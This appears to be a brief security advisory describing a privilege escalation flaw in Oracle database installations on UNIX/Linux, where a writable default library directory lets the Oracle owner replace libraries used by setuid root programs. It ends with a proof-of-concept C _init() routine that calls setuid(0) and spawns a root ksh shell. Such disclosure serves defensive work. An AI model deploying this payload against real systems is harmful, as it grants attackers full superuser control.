Oracle database implementations are reportedly prone to a default library directory privilege escalation vulnerability. This issue arises due to a default configuration error that will permit the attacker to replace libraries required by setuid root applications with arbitrary code.

This issue would allow an Oracle software owner to execute code as the superuser, taking control of the entire system.

It should be noted that this vulnerability only affects Oracle on UNIX/Linux platforms.

_init() {
printf("en el _init()\n");
printf("Con PID=%i y EUID=%i",getpid(),getuid());
setuid(0);
system("/usr/bin/ksh");
printf("Saliendo del Init()\n");
}
